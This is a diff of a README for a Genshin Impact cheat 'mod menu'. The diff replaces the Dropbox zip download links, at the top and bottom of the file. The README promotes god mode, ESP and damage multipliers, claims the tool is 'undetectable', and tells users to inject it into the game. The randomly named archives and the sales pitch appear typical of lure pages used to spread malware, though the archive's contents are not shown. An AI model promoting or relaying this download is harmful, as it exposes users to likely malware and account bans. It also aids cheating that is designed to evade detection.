@@ -3,7 +3,7 @@
 ## 🚀 About  
 This **Genshin Impact Mod Menu** is a feature-packed tool designed to enhance your gameplay experience. With powerful cheats like **God Mode, Infinite Stamina, Damage Multiplier, ESP**, and more, you can explore Teyvat like never before. The mod menu is optimized for undetectable use, offering a smooth and safe experience with a user-friendly interface.  
 
-[![Download GenshinImpact ](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download GenshinImpact ](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
 
 ## 🎯 Features  
 - **God Mode** – Take no damage from enemies or environmental hazards.  
@@ -25,4 +25,4 @@ This **Genshin Impact Mod Menu** is a feature-packed tool designed to enhance yo
 3. Open Genshin Impact and inject the menu.  
 4. Enjoy enhanced gameplay!
 
-[![Download GenshinImpact ](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download GenshinImpact ](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
